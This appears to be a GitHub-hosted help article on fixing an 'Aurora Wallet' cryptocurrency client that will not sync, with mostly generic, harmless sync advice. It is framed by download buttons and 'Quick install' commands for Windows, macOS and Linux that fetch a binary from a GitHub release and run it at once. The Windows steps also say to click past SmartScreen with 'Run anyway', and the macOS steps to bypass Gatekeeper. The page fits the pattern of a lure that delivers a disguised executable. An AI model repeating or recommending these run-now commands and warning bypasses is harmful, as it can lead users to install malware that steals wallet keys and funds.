![Aurora Wallet not syncing guide](assets/aurora-wallet-guide-article-banner.png)

# Aurora Wallet not syncing: causes and step-by-step fixes

Why the progress bar stops, what to check first, and how to resync without touching your wallet file.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


A stalled sync is a connection or database problem, never a lost balance.

The wallet downloads and verifies every block in order. When that process stops, the cause is almost always one of five things: a firewall blocking the peer port, a system clock that is minutes off, a database interrupted mid-write, an old build following an abandoned chain, or a network that throttles peer traffic.

<!-- ARTICLE-BODY-BEGIN -->

## Check these before anything else

Look at the peer count at the bottom of the window. A count of zero points at the network, not the chain. A healthy count with a frozen percentage points at the local database. That single reading splits the diagnosis in half.

Restart the wallet once and give it five minutes. A great many stalls are a peer that went away during the initial handshake, and the restart picks a new peer immediately.

## Fix in order

1. Copy your wallet file to an external drive before changing anything.
2. Confirm the system clock is set automatically and is within a minute of real time.
3. Allow the wallet through the firewall on private networks, and through any third-party security suite.
4. Check that you are running the current build rather than an older installer.
5. Change the data directory setting only if the disk is full; a full disk stops the write and looks like a stall.
6. Restart the wallet and leave it open for at least fifteen minutes before judging progress.

The clock step catches more cases than people expect, because a machine that has been asleep for weeks can drift far enough for peers to reject its timestamps. Time synchronisation is a setting, not a repair.

## Rebuild the chain without losing coins

If the database is damaged, stop the wallet, open the data directory and rename the `blocks` and `chainstate` folders. The wallet downloads a clean copy on the next start, which takes hours rather than minutes but needs no further input. Never rename or delete the wallet file itself; that file holds the keys.

<a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/15-chain-split-resync.md">Chain split and resync</a> covers the case where a correct sync lands on the wrong chain, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/12-no-peers-connection.md">restoring a peer connection</a> covers a wallet that never finds a peer at all.

Start from the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> when you rebuild, so the new chain data matches the current network rules.

## FAQ

### Am I losing coins while the wallet is stalled?

No. The balance is recorded on the public chain by every node in the network. Your local copy simply cannot see the latest blocks yet.

### How long does a full sync take?

From a few hours to more than a day, depending on the disk, the processor and the connection. An SSD shortens it substantially.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [No peers connection](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/12-no-peers-connection.md)
- [Chain split and resync](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/15-chain-split-resync.md)
- [Zero balance](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/13-zero-balance.md)
- [Crash on launch](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/14-crash-on-launch.md)
